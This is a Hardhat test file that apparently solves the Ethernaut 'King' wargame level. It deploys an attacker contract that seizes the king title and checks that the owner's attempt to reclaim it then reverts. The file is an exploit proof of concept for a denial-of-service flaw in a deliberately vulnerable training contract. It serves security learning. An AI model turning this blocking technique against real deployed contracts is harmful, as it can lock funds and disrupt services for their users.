import { expect } from "chai";
import { ethers } from "hardhat";

describe("King", async function () {

  it("Should prevent the owner from reclaiming the king title.", async function () {
    //setup+
    const [deployer, attacker] = await ethers.getSigners()
    const King = await ethers.getContractFactory("King");
    const king = await King.deploy({ value: ethers.utils.parseEther("0.001") });
    await king.deployed();
    //setup-



    //1.Deploy attacker
    const KingAttacker = await ethers.getContractFactory("KingAttacker");
    const kingAttacker = await KingAttacker.connect(attacker).deploy(king.address);
    await kingAttacker.deployed();

    //2.Get prize
    const prize = await king.prize()

    expect(await king._king()).to.eq(deployer.address)

    //3.Send ether >= prize
    await kingAttacker.sendToKing({ value: prize })

    expect(await king._king()).to.eq(kingAttacker.address)
    //When he owner tries to reclaim the king title it fails
    await expect(
      deployer.sendTransaction({ to: king.address, value: 0 })
    ).to.be.reverted;
  });
});